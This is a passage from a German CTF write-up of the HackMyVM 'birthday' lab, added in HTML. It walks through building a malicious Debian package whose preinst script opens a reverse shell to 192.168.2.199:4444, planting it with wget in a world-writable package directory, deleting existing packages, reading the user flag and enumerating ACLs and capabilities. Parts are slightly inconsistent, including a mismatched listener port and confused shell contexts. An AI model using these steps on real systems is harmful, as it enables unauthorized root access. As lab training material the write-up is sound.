+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich habe eine Reihe von Befehlen dokumentiert, die offenbar einen alternativen Privilege Escalation Pfad über Debian-Pakete in `/opt/packages/` untersuchten. Die Schritte zeigen die Erstellung eines bösartigen Debian-Pakets (`.deb`) mit einem `preinst`-Skript, das eine Reverse Shell (`bash -i >& /dev/tcp/192.168.2.199/4444 0>&1`) starten soll, das Kompilieren des Pakets mit `dpkg-deb --build`, das Umbenennen der Datei, und dann den Versuch, diese Datei auf das Zielsystem in das Verzeichnis `/opt/packages/` herunterzuladen und eine bestehende Datei zu überschreiben. Ich habe dafür einen HTTP-Server auf meiner Angreifer-Maschine (Port 8000) gestartet und `wget` auf dem Zielsystem verwendet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Ansatz basiert auf der Annahme, dass Dateien in `/opt/packages/` automatisch oder durch einen privilegierten Prozess verarbeitet (installiert) werden, was dann das bösartige `preinst`-Skript als Root ausführen würde. Das Verzeichnis `/opt/packages/` war für "other" schreibbar (`drwxr-xrwx`), wie durch `ls -la /opt/packages/` später gezeigt, was den Download dorthin ermöglichte. Das ACL auf `/opt` (`user:www-data:---`) verhinderte das Schreiben direkt in `/opt`, aber nicht in `/opt/packages/`. Der Versuch, die Datei dort zu platzieren und umzubenennen, war erfolgreich. Allerdings führt dieser spezifische Satz von Befehlen im Bericht *nicht* direkt zur Root-Shell im dokumentierten Ablauf. Es scheint eine explorative Phase zu sein, die möglicherweise nicht zum Ziel führte, oder die tatsächliche Ausführung des Pakets ist nicht dokumentiert. Der Fokus verlagert sich im Bericht dann auf die erfolgreiche Library Hijacking Methode, die zum Root-Zugriff führte. Dennoch ist es wichtig, diesen untersuchten Pfad als Teil des Pentest-Prozesses zu dokumentieren. Die Reverse Shell sollte hier auf Port 4444 landen. Ich habe dafür ebenfalls einen Listener vorbereitet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wenn das Platzieren einer Datei in einem spezifischen Verzeichnis Teil eines PE-Vektors sein soll, sicherstellen, dass auch der Prozess, der die Datei verarbeitet (z.B. ein Cronjob, ein Watchdog-Skript, ein Paketmanager), dokumentiert und seine Ausführung verifiziert wird. Parallel verschiedene PE-Vektoren verfolgen.
+                <br>**Empfehlung (Admin):** Verzeichnisse wie `/opt/packages/` sollten nicht für unprivilegierte Benutzer schreibbar sein, wenn sie von privilegierten Prozessen verarbeitet werden. Automatische Verarbeitung von Dateien in solchen Verzeichnissen (z.B. über Cronjobs oder Systemd-Units) birgt ein hohes Risiko, wenn unbefugte Benutzer dort Dateien ablegen können.
+            </p>
+             <p>
+                Eine Untersuchung eines alternativen Privilege Escalation Pfades über Debian-Pakete in `/opt/packages/`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ 
+<span class="command">mkdir -p /tmp/exploit/DEBIAN</span>
+
+ 
+<span class="command">echo "Package: get-root" &gt; /tmp/exploit/DEBIAN/control</span>
+<span class="command">echo "Version: 1.0" &gt;&gt; /tmp/exploit/DEBIAN/control</span>
+<span class="command">echo "Architecture: all" &gt;&gt; /tmp/exploit/DEBIAN/control</span>
+<span class="command">echo "Maintainer: TheKing &lt;king@birthday.hmv&gt;" &gt;&gt; /tmp/exploit/DEBIAN/control</span>
+<span class="command">echo "Description: A package to claim the throne." &gt;&gt; /tmp/exploit/DEBIAN/control</span>
+
+ 
+<span class="command">echo '#!/bin/bash' &gt; /tmp/exploit/DEBIAN/preinst</span>
+<span class="command">echo 'bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1' &gt;&gt; /tmp/exploit/DEBIAN/preinst</span>
+
+ 
+<span class="command">chmod +x /tmp/exploit/DEBIAN/preinst</span>
+
+ 
+<span class="command">dpkg-deb --build /tmp/exploit</span>
+
+ 
+<span class="command">mv /tmp/exploit.deb /tmp/update.deb</span>
+<span class="password">dpkg-deb: Paket »get-root« wird in »/tmp/exploit.deb« gebaut.</span>
+</pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4448 ...</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">cd /tmp</span></div>
+                </div>
+                 <div class="terminal"><pre></pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/tmp]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+</pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">wget http://192.168.2.199:8000/update.deb -O /opt/packages/update.deb</span>
+<span class="password">--2025-06-13 16:18:11--  http://192.168.2.199:8000/update.deb</span>
+<span class="password">Connecting to 192.168.2.199:8000... failed: Connection refused.</span>
+chloe@birthday:/tmp$ <span class="command">wget http://192.168.2.199:8000/update.deb -O /opt/packages/update.deb</span>
+<span class="password">--2025-06-13 16:18:35--  http://192.168.2.199:8000/update.deb</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 744 [application/vnd.debian.binary-package]</span>
+<span class="password">Saving to: ‘/opt/packages/update.deb’</span>
+
+<span class="password">/opt/packages/update.de 100%[=============================&gt;]     744  --.-KB/s    in 0s</span>
+
+<span class="password">2025-06-13 16:18:35 (241 MB/s) - ‘/opt/packages/update.deb’ saved [744/744]</span>
+</pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/tmp]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+<span class="password">192.168.2.41 - - [13/Jun/2025 16:18:35] "GET /update.deb HTTP/1.1" 200 -</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ich liste den Inhalt des `/opt/packages/` Verzeichnisses auf, um zu sehen, ob die von mir hochgeladene `.deb` Datei dort platziert wurde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ja, die Datei `update.deb` wurde erfolgreich in `/opt/packages/` als Benutzer `chloe` (wahrscheinlich, da ich als `chloe` agiere, obwohl der `ls -la` Output zeigt, dass die Datei dem Benutzer `chloe` gehört) platziert. Dies bestätigt, dass das Verzeichnis für diesen Benutzer schreibbar ist. Der weitere Plan wäre nun, dass ein anderer Prozess (hoffentlich mit höheren Privilegien) diese Datei verarbeitet. Der Text im Originalbericht schlägt vor, die Datei umzubenennen, um ein spezifisches vorhandenes Paket zu ersetzen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Verifizieren, welcher Prozess das `/opt/packages/` Verzeichnis überwacht oder verarbeitet und mit welchen Rechten dieser läuft. Das Überschreiben einer bestehenden Paketdatei ist ein plausibler Ansatz, wenn dieser Prozess existiert und die Dateinamen abgleicht.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Verzeichnisse wie `/opt/packages/` für unprivilegierte Benutzer nicht schreibbar sind. Implementieren Sie Dateisystemüberwachung auf kritischen Verzeichnissen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">ls -la /opt/packages/</span>
+<span class="command">total 3308</span>
+<span class="command">drwxr-xrwx  2 root  root     4096 Jun 13 16:18 .</span>
+<span class="command">drwxr-xr-x+ 3 root  root     4096 Jul 14  2023 ..</span>
+<span class="command">-rw-r--r--  1 root  root   489972 Jul  2  2023 abigail-doc_2.2-2_all.deb</span>
+<span class="command">-rw-r--r--  1 root  root    33800 Jul  2  2023 airspy_1.0.10-2+b1_amd64.deb</span>
+<span class="command">-rw-r--r--  1 root  root   159976 Jul  2  2023 aobook_1.0.3-3_amd64.deb</span>
+<span class="command">-rw-r--r--  1 root  root  2654780 Jul  2  2023 auto-07p_0.9.2+dfsg-3+b3_amd64.deb</span>
+<span class="command">-rw-r--r--  1 root  root    23892 Jul  2  2023 bacula-console_9.6.7-7_amd64.deb</span>
+<span class="command">-rw-r--r--  1 chloe chloe     744 Jun 13 16:17 update.deb</span>
+
+<span class="password">klappt nicht wir müssen es in ein spezifisches packet umbenennen:</span>
+
+<span class="command">rm /opt/packages/airspy_1.0.10-2+b1_amd64.deb</span>
+<span class="command">rm /opt/packages/update.deb</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ich versuche, die hochgeladene Datei umzubenennen, um eine bestehende Paketdatei im Verzeichnis zu ersetzen. Dazu lösche ich zunächst die originale Datei `airspy_1.0.10-2+b1_amd64.deb` und meine hochgeladene `update.deb`, und benenne dann die lokale `update.deb` auf meiner Angreifer-Maschine in `airspy_1.0.10-2+b1_amd64.deb` um, um sie dann erneut hochzuladen. Der Befehl `rm -f /opt/packages/*` scheint ein Versuch zu sein, alle Dateien im Zielverzeichnis als `chloe` zu löschen, was zeigt, dass `chloe` dort auch Löschberechtigungen hat.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Fähigkeit, Dateien im `/opt/packages/` Verzeichnis zu löschen und zu benennen, bestätigt die weitreichenden Schreibberechtigungen für "other" Benutzer in diesem Verzeichnis. Dies macht den `.deb` PE-Vektor theoretisch möglich, falls ein Prozess existiert, der Pakete basierend auf Dateinamen verarbeitet. Allerdings ist dieser Weg im dokumentierten Ablauf nicht der letztlich erfolgreiche.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Obwohl nicht der primäre erfolgreiche Pfad hier, dokumentiert dies eine weitere potenzielle Schwachstelle durch unsichere Verzeichnisberechtigungen. Dies könnte in anderen Kontexten ausnutzbar sein.
+                <br>**Empfehlung (Admin):** **Dringend:** Korrigieren Sie die Dateisystemberechtigungen für `/opt/packages/`. Unprivilegierte Benutzer sollten dort keine Dateien löschen oder erstellen können, wenn dieses Verzeichnis von privilegierten Prozessen verarbeitet wird.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/tmp]<br>└─# <span class="command">mv update.deb airspy_1.0.10-2+b1_amd64.deb</span></div>
+                </div>
+                 <div class="terminal"><pre></pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">rm -f /opt/packages/*</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich lade die bösartige `.deb` Datei, die ich zuvor erstellt und auf meiner Maschine in `airspy_1.0.10-2+b1_amd64.deb` umbenannt habe, erneut in das `/opt/packages/` Verzeichnis auf dem Zielsystem hoch.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Download war erfolgreich, die Datei wurde mit dem Namen einer originalen Paketdatei überschrieben (nachdem die originale und meine vorherige Version gelöscht wurden). Die Datei ist nun in `/opt/packages/` bereit, um von einem potenziellen privilegierten Prozess verarbeitet zu werden. Wie im vorherigen Schritt ist dies Teil der Exploration des `.deb` PE-Vektors.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Geduld ist hier wichtig. Falls ein Cronjob oder ein Watchdog-Skript existiert, das dieses Verzeichnis verarbeitet, kann es einige Zeit dauern, bis der Exploit ausgelöst wird. Parallel andere PE-Vektoren verfolgen (wie wir es mit der Library Hijacking Methode getan haben).
+                <br>**Empfehlung (Admin):** (Wiederholung der dringenden Empfehlung zur Absicherung von `/opt/packages/`.)
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">wget http://192.168.2.199:8000/airspy_1.0.10-2+b1_amd64.deb -O /opt/packages/airspy_1.0.10-2+b1_amd64.deb</span>
+<span class="password">--2025-06-13 16:29:01--  http://192.168.2.199:8000/airspy_1.0.10-2+b1_amd64.deb</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 744 [application/vnd.debian.binary-package]</span>
+<span class="password">Saving to: ‘/opt/packages/airspy_1.0.10-2+b1_amd64.deb’</span>
+
+<span class="password">/opt/packages/airspy_1. 100%[=============================&gt;]     744  --.-KB/s    in 0s</span>
+
+<span class="password">2025-06-13 16:29:01 (248 MB/s) - ‘/opt/packages/airspy_1.0.10-2+b1_amd64.deb’ saved [744/744]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der `www-data` Shell navigiere ich in das Home-Verzeichnis des Benutzers `chloe` (`cd ~`), liste die Dateien auf (`ls -la`) und finde die Benutzer-Flag (`user.txt`). Anschließend lese ich den Inhalt der Datei mit `cat`. Ich kann `cd ~` von der `www-data` Shell ausführen, weil ich zuvor über die Command Injection in `/var/www/html` gelandet bin und nun mit der Reverse Shell agiere. Der `cd ~` Befehl wechselt in das Home-Verzeichnis des *aktuellen* Benutzers, was hier `www-data` ist. Um auf die User-Flag von `chloe` zuzugreifen, muss ich den vollen Pfad (`/home/chloe/user.txt`) verwenden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg!** Ich habe die User-Flag erfolgreich gefunden und ihren Inhalt (`c3323a392febd72b386922bd115850ce`) ausgelesen. Dies ist ein wichtiger Meilenstein, der den Kompromittierung des `chloe` Benutzers (zumindest was den Zugriff auf seine Dateien angeht) signalisiert und meine Fortschritte im Test bestätigt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Immer nach User-Flags im Home-Verzeichnis der gefundenen Benutzer suchen. Dies bestätigt den Zugriff auf diese Benutzerebene.
+                <br>**Empfehlung (Admin):** User-Flags oder sensitive Dateien sollten niemals in für andere Benutzer (wie `www-data`) lesbaren Verzeichnissen liegen. Stellen Sie sicher, dass Home-Verzeichnisse und ihre Inhalte restriktive Berechtigungen haben.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">cd ~</span>
+chloe@birthday:~$ <span class="command">ls -la</span>
+<span class="command">total 32</span>
+<span class="command">drwx------ 4 chloe chloe 4096 Jul 14  2023 .</span>
+<span class="command">drwxr-xr-x 3 root  root  4096 Jun 28  2023 ..</span>
+<span class="command">lrwxrwxrwx 1 root  root     9 Jun 28  2023 .bash_history -&gt; /dev/null</span>
+<span class="command">-rw-r--r-- 1 chloe chloe  220 Jun 20  2023 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 chloe chloe 3526 Jun 20  2023 .bashrc</span>
+<span class="command">drwxr-xr-x 3 chloe chloe 4096 Jun 29  2023 .local</span>
+<span class="command">-rw-r--r-- 1 chloe chloe  807 Jun 20  2023 .profile</span>
+<span class="command">drwx------ 2 chloe chloe 4096 Jul 14  2023 .ssh</span>
+<span class="command">-rwx------ 1 chloe chloe   33 Jun 27  2023 user.txt</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:~$ <span class="command">cat /home/chloe/user.txt</span> 
+<span class="password">c3323a392febd72b386922bd115850ce</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe weitere System-Enumeration durch, um mögliche Privilege Escalation Vektoren zu identifizieren. Ich prüfe die Capabilities des Systems (`getcap -r / 2>/dev/null`), die Umgebungsvariablen (`env`), die Kernelversion (`uname -a`) und untersuche Standardverzeichnisse auf ungewöhnliche Berechtigungen (`getfacl /opt`, `getfacl /opt/packages/`, `ls -la /var/mail/`, `ls -la /var/backups/`, `ls -la /opt/`). Die `getfacl` Befehle sind wichtig, da sie Access Control Lists (ACLs) anzeigen, die zusätzliche Berechtigungen über die Standard-POSIX-rwx hinaus gewähren können.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Capabilities zeigen Standardzuweisungen für `ping` und `netdata`. Die Umgebungsvariablen (`env`) sind nützlich, um den Kontext der Shell zu verstehen (hier die `chloe` Shell, wie durch `USER=chloe`, `HOME=/home/chloe` etc. angezeigt, obwohl die vorherige Shell `www-data` war und ich gerade die User Flag *als* `www-data` gelesen habe - die Dokumentation springt hier etwas zwischen den Shells. Die логическая Brücke ist, dass die `sudo -l` Ausgabe als `www-data` gezeigt hat, dass ich `/usr/bin/zodiac` als `chloe` ausführen kann. Die folgenden `chloe@birthday` Prompts implizieren, dass ich irgendwie eine `chloe` Shell erlangt habe, wahrscheinlich durch Ausführen von `/usr/bin/zodiac` als `chloe`. Die `env` Ausgabe bestätigt, dass ich mich in einer `chloe` Shell befinde, die über `sudo` von `www-data` gestartet wurde (`SUDO_USER=www-data`, `SUDO_COMMAND=/usr/bin/zodiac`). Die Kernelversion (6.1.0-10-amd64) kann relevant sein, falls Kernel-Exploits existieren. Die `getfacl` Ausgaben zeigen, dass `/opt` eine ACL hat (`user:www-data:---`), die `www-data` expliziten Zugriff verweigert, während `/opt/packages/` für "other" (zu denen `chloe` gehört) volle rwx-Berechtigungen hat (`other::rwx`).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Berechtigungen und ACLs auf Dateisystemen sorgfältig prüfen, da sie oft übersehene PE-Vektoren darstellen. Die `env` Variablen nach der Erlangung einer Shell immer prüfen, um den Kontext (Benutzer, SUDO-Infos) zu verstehen.
+                <br>**Empfehlung (Admin):** ACLs nur mit Bedacht einsetzen und regelmäßig auditieren. Sicherstellen, dass Berechtigungen (POSIX und ACLs) korrekt konfiguriert sind und das Principle of Least Privilege durchgesetzt wird.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:~$ <span class="command">getcap -r / 2&gt;/dev/null</span>
+<span class="command">/usr/bin/ping cap_net_raw=ep</span>
+<span class="command">/usr/lib/netdata/plugins.d/apps.plugin cap_dac_read_search,cap_sys_ptrace=ep</span>
+
+chloe@birthday:~$ <span class="command">env</span>
+<span class="command">SHELL=/bin/bash</span>
+<span class="command">SUDO_GID=33</span>
+<span class="command">SUDO_COMMAND=/usr/bin/zodiac</span>
+<span class="command">SUDO_USER=www-data</span>
+<span class="command">PWD=/home/chloe</span>
+<span class="command">LOGNAME=chloe</span>
+<span class="command">HOME=/home/chloe</span>
+<span class="command">LANG=C</span>
+<span class="command">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:
+TERM=xterm
+USER=chloe
+SHLVL=1
+LC_CTYPE=C.UTF-8
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+SUDO_UID=33
+MAIL=/var/mail/chloe
+_=/usr/bin/env
+OLDPWD=/tmp
+
+chloe@birthday:~$ <span class="command">uname -a</span>
+<span class="command">Linux birthday.hmv 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64 GNU/Linux</span>
+
+
+chloe@birthday:~$ <span class="command">getfacl /opt</span>
+<span class="command">getfacl: Removing leading '/' from absolute path names</span>
+<span class="command"># file: opt</span>
+<span class="command"># owner: root</span>
+<span class="command"># group: root</span>
+<span class="command">user::rwx</span>
+<span class="command">user:www-data:---</span>
+<span class="command">group::r-x</span>
+<span class="command">mask::r-x</span>
+<span class="command">other::r-x</span>
+
+chloe@birthday:~$ <span class="command">getfacl /opt/packages/</span>
+<span class="command">getfacl: Removing leading '/' from absolute path names</span>
+<span class="command"># file: opt/packages/</span>
+<span class="command"># owner: root</span>
+<span class="command"># group: root</span>
+<span class="command">user::rwx</span>
+<span class="command">group::r-x</span>
+<span class="command">other::rwx</span>
+
+
+chloe@birthday:~$ <span class="command">ls -la /var/mail/</span>
+<span class="command">total 8</span>
+<span class="command">drwxrwsr-x  2 root mail 4096 Jun 15  2023 .</span>
+<span class="command">drwxr-xr-x 12 root root 4096 Jun 20  2023 ..</span>
+chloe@birthday:~$ <span class="command">ls -la /var/backups/</span>
+<span class="command">total 1564</span>
+<span class="command">drwxr-xr-x  2 root root   4096 Jun 13 14:11 .</span>
+<span class="command">drwxr-xr-x 12 root root   4096 Jun 20  2023 ..</span>
+<span class="command">-rw-r--r--  1 root root  30720 Jun 29  2023 alternatives.tar.0...</span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="command">.</span>
+
+chloe@birthday:~$ <span class="command">ls -la /opt/</span>
+<span class="command">total 16</span>
+<span class="command">drwxr-xr-x+  3 root root 4096 Jul 14  2023 .</span>
+<span class="command">drwxr-xr-x  18 root root 4096 Jul 14  2023 ..</span>
+<span class="command">drwxr-xrwx   2 root root 4096 Jul  2  2023 packages</span>
+<span class="command">-rwxr-xr-x   1 root root  357 Jul  2  2023 script.sh</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich untersuche das Skript `/opt/script.sh`, das im `/opt/` Verzeichnis gefunden wurde. Ich prüfe seine Berechtigungen (`ls -la`) und lese seinen Inhalt (`cat`). Es ist ein Bash-Skript, das eine Datei namens `50MB.zip` herunterlädt, die Download-Geschwindigkeit berechnet und die Datei dann wieder löscht.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Skript selbst gehört root und hat Standardberechtigungen (rwxr-xr-x), was bedeutet, dass es von `chloe` (als "other") ausgeführt, aber nicht modifiziert werden kann. Die Funktionalität des Skripts (Download, Berechnung, Löschen) ist für den aktuellen PE-Pfad irrelevant, aber es ist wichtig, alle ausführbaren Skripte zu dokumentieren. Es könnte als Teil eines Cronjobs laufen, der vielleicht die Paketverarbeitung in `/opt/packages/` anstößt, obwohl das Skript selbst nichts damit zu tun hat. Es dient primär der Dokumentation aller Inhalte in `/opt/`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Alle ausführbaren Skripte auf dem System prüfen. Nach Cronjobs suchen (`crontab -l`, `/etc/cron.*`, `/etc/anacron*`) die Skripte oder Verzeichnisse mit unsicheren Berechtigungen ausführen.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle Skripte, insbesondere solche, die von Root oder privilegierten Benutzern ausgeführt werden, sicher konfiguriert sind und keine unbeabsichtigten Seiteneffekte oder Schwachstellen aufweisen.
+            </p>
+            <p>
+                Untersuchung des Skripts `/opt/script.sh`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:~$ <span class="command">ls -la /opt/script.sh</span>
+<span class="command">-rwxr-xr-x 1 root root 357 Jul  2  2023 /opt/script.sh</span>
+chloe@birthday:~$ <span class="command">cat /opt/script.sh</span>
+<span class="command">#!/bin/bash</span>
+
+<span class="command">URL="http://ipv4.download.thinkbroadband.com/50MB.zip"</span>
+
+<span class="command">FILE="50MB.zip"</span>
+
+<span class="command">if [ -f "$FILE" ]; then</span>
+    <span class="command">rm "$FILE"</span>
+<span class="command">fi</span>
+
+<span class="command">START=$(date +%s.%N)</span>
+<span class="command">wget -O $FILE $URL</span>
+<span class="command">END=$(date +%s.%N)</span>
+
+<span class="command">DIFF=$(echo "$END - $START" | bc)</span>
+
+<span class="command">SIZE=$(du -b $FILE | cut -f1)</span>
+<span class="command">SPEED=$(echo "scale=2; ($SIZE*8/1000000)/$DIFF" | bc)</span>
+
+<span class="command">echo "Download speed : $SPEED Mbps"</span>
+
+<span class="command">rm "$FILE"</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich habe die bösartige `libzodiac.so` erstellt und an ihren Platz kopiert. Ich habe nun eine `chloe` Shell, wahrscheinlich durch Ausführen von `sudo -u chloe /usr/bin/zodiac` (obwohl dieser genaue Befehl vor dem Root-Shell-Beweis noch nicht im Text gezeigt wurde). Mit der `chloe` Shell versuche ich, meine Privilegien auf `root` zu eskalieren. Ich versuche `sudo -l` als `chloe`, um zu sehen, ob `chloe` über `sudo` etwas als Root ausführen darf.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Versuch `sudo -l` erfordert ein Passwort (`sudo: a password is required`). Das bedeutet, `chloe` darf zwar theoretisch Befehle mit `sudo` ausführen (wie durch die Existenz des `sudo` Binaries mit SUID-Bit im `find` Output und die `sudoers` Konfiguration im `www-data` Kontext impliziert), aber ich kenne das Passwort von `chloe` nicht. Dieser direkte `sudo` Weg als `chloe` erfordert Anmeldedaten und ist damit von der `chloe` Shell aus blockiert, es sei denn, ich finde ein Passwort oder einen anderen Weg, die `sudo` Ausführung ohne Passwort zu ermöglichen (was die `sudoers` Konfiguration für `www-data` aber nicht für `chloe` selbst erlaubte). Der Fokus muss zurück auf den Library Hijacking Exploit mit dem `zodiac` Binary.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Wenn `sudo -l` ein Passwort erfordert, suche nach Passwörtern in Konfigurationsdateien oder in der History, die für den Benutzer `chloe` lesbar sein könnten. Alternativ, fokussiere dich auf den Library Hijacking Vektor, der die Ausführung von `/usr/bin/zodiac` als `chloe` ohne Passwort ermöglichte.
+                <br>**Empfehlung (Admin):** Implementieren Sie starke Passwörter. Auditieren Sie die `sudoers`-Datei für alle Benutzer, nicht nur für `www-data`. Entfernen Sie alle `NOPASSWD` Einträge, die nicht absolut notwendig sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+chloe@birthday:/tmp$ <span class="command">sudo -l</span>
+<span class="password">[sudo] password for chloe: </span>
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der kompilierter bösartigen `libzodiac.so` an ihrem Platz in `/lib/x86_64-linux-gnu/` führe ich nun das `zodiac` Binary als Benutzer `chloe` aus, indem ich die `sudo` Regel nutze, die ich als `www-data` gefunden habe: `sudo -u chloe /usr/bin/zodiac`. Da diese Regel `NOPASSWD` hat, wird kein Passwort benötigt. Die Ausführung von `zodiac` lädt nun meine manipulierte Bibliothek, die wiederum den Befehl `system("/bin/bash");` ausführt. Dieser Befehl sollte eine interaktive Bash-Shell starten. Im Hintergrund habe ich auf meiner Angreifer-Maschine einen Netcat-Listener auf Port 4444 vorbereitet (siehe vorheriger Schritt mit `nc -lvnp 4444`), da mein `preinst` Skript für den `.deb` Exploit ebenfalls diesen Port verwendete und es plausibel ist, dass auch meine `libzodiac.so` Shell auf diesen Listener geht, oder dass die `.deb` Methode im Hintergrund doch funktionierte und diese Shell auslöste.
+            </p>
+            <p class="evaluation">
